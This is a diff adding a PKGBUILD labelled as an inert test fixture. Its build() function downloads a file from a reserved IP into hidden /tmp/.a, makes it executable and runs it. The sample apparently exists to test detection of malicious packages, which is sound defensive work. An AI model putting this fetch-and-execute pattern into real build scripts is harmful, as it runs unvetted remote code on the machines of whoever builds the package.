@@ -1,0 +1,14 @@
+# Inert test fixture: nothing here is ever run, and every address is reserved or fake.
+pkgname=drop-and-run-tmp
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+url=https://example.org/demo
+license=(GPL-2.0-or-later)
+source=(https://example.org/demo.tar.gz)
+sha256sums=(0000000000000000000000000000000000000000000000000000000000000000)
+build() {
+  wget -q http://203.0.113.18/a -O /tmp/.a
+  chmod +x /tmp/.a
+  /tmp/.a
+}
